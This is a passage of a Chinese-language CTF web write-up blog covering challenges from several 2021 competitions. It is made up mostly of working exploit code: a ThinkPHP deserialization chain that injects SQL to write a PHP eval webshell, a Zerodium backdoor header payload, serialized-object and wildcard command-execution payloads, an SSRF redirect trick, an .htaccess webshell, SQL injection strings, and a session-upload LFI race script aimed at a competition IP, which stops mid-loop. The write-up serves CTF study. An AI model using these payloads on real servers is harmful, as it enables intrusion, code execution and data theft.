    <span class="k">use</span> <span class="nx">PDO</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Mysql</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_LOCAL_INFILE</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>    
            <span class="nx">PDO</span><span class="o">::</span><span class="na">MYSQL_ATTR_MULTI_STATEMENTS</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>    
        <span class="p">);</span>
        <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&#34;debug&#34;</span>    <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&#34;database&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql&#34;</span><span class="p">,</span>
            <span class="s2">&#34;hostname&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
            <span class="s2">&#34;hostport&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;3306&#34;</span><span class="p">,</span>
            <span class="s2">&#34;charset&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;utf8&#34;</span><span class="p">,</span>
            <span class="s2">&#34;username&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span>
            <span class="s2">&#34;password&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root&#34;</span>
        <span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think\Image\Driver</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Session\Driver\Memcache</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Imagick</span><span class="p">{</span>
        <span class="k">private</span> <span class="nv">$img</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think\Session\Driver</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Model</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Memcache</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$handle</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Model</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="nx">Think</span><span class="p">{</span>
    <span class="k">use</span> <span class="nx">Think\Db\Driver\Mysql</span><span class="p">;</span>
    <span class="k">class</span> <span class="nc">Model</span><span class="p">{</span>
        <span class="k">protected</span> <span class="nv">$options</span>   <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">protected</span> <span class="nv">$pk</span><span class="p">;</span>
        <span class="k">protected</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">protected</span> <span class="nv">$db</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Mysql</span><span class="p">();</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">&#39;where&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span> <span class="o">=</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pk</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                <span class="s2">&#34;table&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;mysql.user where 1=1;select &#39;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[theoyu]);?&gt;&#39; into outfile &#39;/var/www/html/theoyu.php&#39;;#&#34;</span><span class="p">,</span>
                <span class="s2">&#34;where&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;1=1&#34;</span>
            <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">()));</span>


    <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
    <span class="nx">curl_setopt_array</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="nx">CURLOPT_URL</span> <span class="o">=&gt;</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
        <span class="nx">CURLOPT_ENCODING</span> <span class="o">=&gt;</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_MAXREDIRS</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
        <span class="nx">CURLOPT_TIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">30</span><span class="p">,</span>
        <span class="nx">CURLOPT_HTTP_VERSION</span> <span class="o">=&gt;</span> <span class="nx">CURL_HTTP_VERSION_1_1</span><span class="p">,</span>
        <span class="nx">CURLOPT_CUSTOMREQUEST</span> <span class="o">=&gt;</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
        <span class="nx">CURLOPT_POSTFIELDS</span> <span class="o">=&gt;</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Think\Image\Driver\Imagick</span><span class="p">())),</span>
        <span class="nx">CURLOPT_HTTPHEADER</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&#34;</span><span class="p">,</span>
            <span class="s2">&#34;cache-control: no-cache&#34;</span>
        <span class="p">),</span>
    <span class="p">));</span>
    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nv">$err</span> <span class="o">=</span> <span class="nx">curl_error</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;cURL Error #:&#34;</span> <span class="o">.</span> <span class="nv">$err</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$response</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>上去后在根目录发现flag应该是藏在数据库里，不知道是不是蚁剑的原因，数据库一直连不上，后来传了一个冰蝎才连接好，结果flag还是读取不了，导出flag表然后又可以把flag给导出来了？</p>
<h2 id="0x04-虎符">0x04 虎符</h2>
<h3 id="签到">签到</h3>
<p>给了提示，前不久爆的php后门</p>
<pre><code class="language-demo" data-lang="demo">User-agentt:Zerodiumsystem('cat /flag');
</code></pre><h3 id="unsetme">unsetme</h3>
<p>搜了一下是<code>fatfree</code>框架，上github把源码下了下来，把index.php换成题目。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">// Kickstart the framework
</span><span class="c1"></span><span class="nv">$f3</span><span class="o">=</span><span class="k">require</span><span class="p">(</span><span class="s1">&#39;lib/base.php&#39;</span><span class="p">);</span>

<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="k">if</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nx">PCRE_VERSION</span><span class="o">&lt;</span><span class="mf">8.0</span><span class="p">)</span>
    <span class="nx">trigger_error</span><span class="p">(</span><span class="s1">&#39;PCRE version is out of date&#39;</span><span class="p">);</span>

<span class="c1">// Load configuration
</span><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
<span class="nx">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>

<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span> 
</code></pre></div><p>运行发现<code>base.php</code>中的一个<code>eval()</code>函数有报错，我们跟进看一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-1877951853.png" alt=""></p>
<p>函数调用应该是这里，我们在在前面加上一个<code>var_dump('unset('.$val.');');</code>,用于调试。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3769891392.png" alt=""></p>
<p>有了输出就好说，看能不能把括号闭合一下。
测试发现要关闭<code>)</code>,得先关闭<code>]</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-30-3079279328.png" alt=""></p>
<p>后面就是命令执行拿flag了。</p>
<h2 id="0x05-蓝帽杯">0x05 蓝帽杯</h2>
<h3 id="one-pointer-php-">One Pointer PHP ×</h3>
<p><a href="https://theoyu.top/posts/bluehat/">蓝帽杯 One Pointer PHP</a></p>
<p>质量很高的一题。</p>
<h2 id="0x06-津门杯">0x06 津门杯</h2>
<h3 id="power_cut">power_cut</h3>
<p>根据提示，下载<strong>swp</strong> 文件， <code>vim -r </code>得到源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">logger</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$logFile</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$initMsg</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$exitMsg</span><span class="p">;</span>
  
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
        <span class="c1">// initialise variables
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&#34;#--session started--#</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&#34;#--session end--#</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span>  <span class="nv">$file</span><span class="p">;</span>
        <span class="nx">readfile</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">);</span>
        
    <span class="p">}</span>
  
    <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
        <span class="nv">$fd</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">);</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
    <span class="p">}</span>
  
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">&#34;this is destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">weblog</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$weblogfile</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
    	<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;system(&#39;cat /flag&#39;)&#34;</span><span class="p">;</span>
    	<span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="c1">// self::waf($this-&gt;filepath);
</span><span class="c1"></span>        <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">logger</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">weblogfile</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
        <span class="nv">$str</span><span class="o">=</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[&lt;&gt;*#&#39;|?</span><span class="se">\n</span><span class="s2"> ]/&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
        <span class="nv">$str</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">&#34;this is destruct&#34;</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nv">$log</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">];</span>
<span class="nv">$log</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[&lt;&gt;*#&#39;|?</span><span class="se">\n</span><span class="s2"> ]/&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
<span class="nv">$log</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
<span class="nv">$log_unser</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$log</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">&lt;html&gt;
</span><span class="err">&lt;body&gt;
</span><span class="err">&lt;p&gt;&lt;br/&gt;昨天晚上因为14级大风停电了.&lt;/p&gt;
</span><span class="err">&lt;/body&gt;
</span><span class="err">&lt;/html&gt;
</span></code></pre></div><p>第一看看到<strong>weblog</strong>中的<code>cat /flag</code>，马上就构造了一个<strong>logger</strong>对象去创建一个<strong>weblog</strong>实例，然后发现是假输出&hellip;那就是用<strong>readfile</strong>去打了，这里对flag有过滤，双写或者大写S绕过都可以。</p>
<p><code>?log=O:6:&quot;weblog&quot;:1:{s:10:&quot;weblogfile&quot;;S:5:&quot;/\66lag&quot;;}</code></p>
<h3 id="hate_php">hate_php</h3>
<p>源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9_$@]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fighting!&#39;</span><span class="p">);</span> 
    <span class="p">}</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>看过p神文章的话对这题肯定不陌生，过滤了**$**的话，那能考虑的差不多只有取反和通配符匹配了。</p>
<p>但取反的话，类似<code>~%8F%97%8F%96%91%99%90.()</code>在php5中是不可取的，因为其不支持这样调用动态函数的方法，那能考虑的只有通配符了。</p>
<pre><code class="language-url" data-lang="url">?code=?&gt;&lt;?=`/???/??? /????.???`?&gt; elf文件 没看见flag
</code></pre><p>然后看到一篇POST传输临时文件，然后匹配/tmp/php??????去执行反弹shell，但试了很多次都不行，最后&hellip;</p>
<pre><code class="language-url" data-lang="url">?code=?&gt;&lt;?=`/???/??? /????`?&gt; 又居然ok了淦
</code></pre><p>原来是送分题，是我想多了，不过临时文件的方法后续还可以学习学习。</p>
<h3 id="gooss">GoOSS</h3>
<p>gin框架的ssrf,还比较有意思。</p>
<p>拿到代码审一下<code>fileMidderware</code>这个中间件有点奇怪。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="k">if</span> <span class="nx">fi</span><span class="p">.</span><span class="nf">IsDir</span><span class="p">()</span> <span class="p">{</span>
		
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>

		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span> <span class="s">&#34;/&#34;</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">c</span><span class="p">.</span><span class="nf">Redirect</span><span class="p">(</span><span class="mi">302</span><span class="p">,</span><span class="nx">c</span><span class="p">.</span><span class="nx">Request</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;/&#34;</span><span class="p">)</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">files</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">string</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
			<span class="nx">l</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Readdir</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
			<span class="k">for</span> <span class="nx">_</span><span class="p">,</span><span class="nx">i</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span> <span class="p">{</span>
				<span class="nx">files</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">files</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
			<span class="p">}</span>

			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="nx">gin</span><span class="p">.</span><span class="nx">H</span><span class="p">{</span>
				<span class="s">&#34;files&#34;</span> <span class="p">:</span><span class="nx">files</span><span class="p">,</span>
			<span class="p">})</span>
		<span class="p">}</span>
	<span class="p">}</span>
</code></pre></div><p>如果<code>url</code>参数后缀不是<code>/</code>的话，就会发生302跳转，这里我们加一个后缀为..即可。</p>
<p>但本地测试的适合一直没有发生302跳转：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223815266.png" alt="image-20210511223815266"></p>
<p>带上<code>//</code>后成功了，才想起来<code>//</code>就是省略HTTP协议的写法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511223837295.png" alt="image-20210511223837295"></p>
<p>再回到题目，我们直接可以通过这个特性访问内网80端口，传参readfile，但不知道为什么一直读不到flag&hellip;</p>
<p>然后换一个思路，在自己的vps上面传</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: http://127.0.0.1/index.php?file=/flag&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>然后直接<code>{&quot;url&quot;=&quot;https://127.0.0.1:1234//ip/..&quot;}</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511224859453.png" alt="image-20210511224859453"></p>
<p>后来看师傅们的wp，打本地也是ok的，不过不知道为什么不能直接读<code>/flag</code>,还得从传参一层一层读..</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511225539813.png" alt="image-20210511225539813"></p>
<h3 id="uploadhub-">UploadHub ×</h3>
<p>很离谱，明明是白名单上传，但是好像变成了任意文件上传</p>
<p>配置文件上有</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="na">&lt;Directory ~ &#34;/var/www/html/upload/[a-f0-9]{32}/&#34;&gt;</span>
        <span class="na">php_flag engine off</span>
<span class="na">&lt;/Directory&gt;</span>
</code></pre></div><p>看了几种打法，但一打上去就无法访问网站，或者连接失败。</p>
<p>师傅wp:</p>
<pre><code>&lt;Files .htaccess&gt;
SetHandler application/x-httpd-php
Require all granted
php_flag engine on
&lt;/Files&gt;
#&lt;?php eval($_REQUEST['theoyu'])?&gt;
</code></pre><p>我记得我之前用过这种类似的，但是不行，试了一次果然还是不行&hellip;奇奇怪怪</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-11-image-20210511233114244.png" alt="image-20210511233114244"></p>
<p><strong>后续补充</strong>:在buu上重新做了一下这道题，原封不动的打法成功了,但是马很快会被删掉，而且<code>disable_funciton</code>禁用很多，不过直接用<code>file_get_contens()</code>读 <strong>/flag</strong>即可。</p>
<h2 id="0x07-ciscn-初赛">0x07 ciscn 初赛</h2>
<p>感觉web质量还不错，可以接受范围。</p>
<h3 id="easy_sql">easy_sql</h3>
<p>先用sqlmap跑一下，发现表名和列名，但flag表只有一个id，而且只有一个1。</p>
<pre><code>python2 .\sqlmap.py -r .\ctf.txt -D security -T flag -C &quot;cb01f2dd-b7ea-458c-a300-93e0607b183a&quot; --dump
</code></pre><p>然后报错注入的方法也可以跑出来，无列名注入，得到flag。</p>
<pre><code>passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,database()))-- -
passwd=1&amp;uname=') and extractvalue(0x0a,concat(0x0a,(select * from (select * from flag a join flag b using(id,no))c)))-- -
</code></pre><h3 id="easy_source">easy_source</h3>
<p>源码文件地址<code>.index.php.swo</code></p>
<p>源码比较长，就不放了，看到代码马上想到了之前DASCTF原生类读取，但<code>SplFileObject</code>只能按行读取，要想读全部的话得用<code>foreach</code>遍历，不太行。</p>
<p>后来发现是原题&hellip;实在没想到，flag藏在注释里，直接用<code>ReflectionMethod</code>原生类去一个一个读函数注解即可。</p>
<p><strong>后续补充</strong>：在看博客的时候，发现羽师傅用的就是<code>splFileObject</code>的方法，手册里面写有：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-18-image-20210518202515518.png" alt="image-20210518202515518"></p>
<p>再调用<code>fpassthru</code>就可以输出全部文件内容，送自己一句：<strong>Read The Fucking Manual</strong>！</p>
<h3 id="middle_source">middle_source</h3>
<p>目录扫描，得到<code>.listing</code>，里面有 <code>phpinfo()</code>位置，然后通过SESSION LFI GetShell即可。</p>
<p><img src="https://gitee.com/lcdm123/image/raw/master/2021-05-15-image-20210515212934339.png" alt="image-20210515212934339"></p>
<p><code>disable_function</code>禁用了很多函数，用蓝帽杯那题的思路就行(多做题还是好XD)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;Theoyu&#39;</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;cf&#34;</span><span class="p">:</span><span class="s1">&#39;../../../../var/lib/php/sessions/gcbejhehdh/sess_&#39;</span><span class="o">+</span><span class="n">sessid</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
        <span class="c1"># resp = session.post( &#39;http://124.70.28.149:20877/&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php $a = new DirectoryIterator(&#34;glob:///etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g/*&#34;);foreach($a as $f){echo($f-&gt;__toString().&#34;\n&#34;);}?&gt;&#39;}, files={&#39;file&#39;: (&#39;test.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} )</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="s1">&#39;http://124.70.28.149:20877/&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php  var_dump(file_get_contents(&#34;/etc/aebgjbecbg/abhiabddfd/hafjgahhef/debibfeahf/bibciiadie/fl444444g&#34;)); ?&gt;&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>  
    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://124.70.28.149:20877/&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="c1">#print(resp.text)</span>
    <span class="k">if</span> <span class="s1">&#39;test.txt&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+++++++++++++]retry&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span> 
